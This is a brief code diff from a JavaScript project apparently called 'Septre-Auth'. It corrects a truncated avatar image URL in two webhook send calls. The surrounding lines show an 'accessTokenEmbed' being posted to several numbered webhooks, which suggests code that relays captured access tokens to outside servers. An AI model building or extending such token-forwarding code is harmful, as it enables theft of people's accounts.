@@ -125,7 +125,7 @@ webhook4.send({
 
         username: 'Septre-Auth',
 
-        avatarURL: 'https://live.staticflickr.com/65535/52932742690_c>
+        avatarURL: 'https://live.staticflickr.com/65535/52932742690_cc1446c553.jpg',
 
         embeds: [accessTokenEmbed],
 
@@ -137,7 +137,7 @@ webhook5.send({
 
         username: 'Septre-Auth',
 
-        avatarURL: 'https://live.staticflickr.com/65535/52932742690_c>
+        avatarURL: 'https://live.staticflickr.com/65535/52932742690_cc1446c553.jpg',
 
         embeds: [accessTokenEmbed],
 
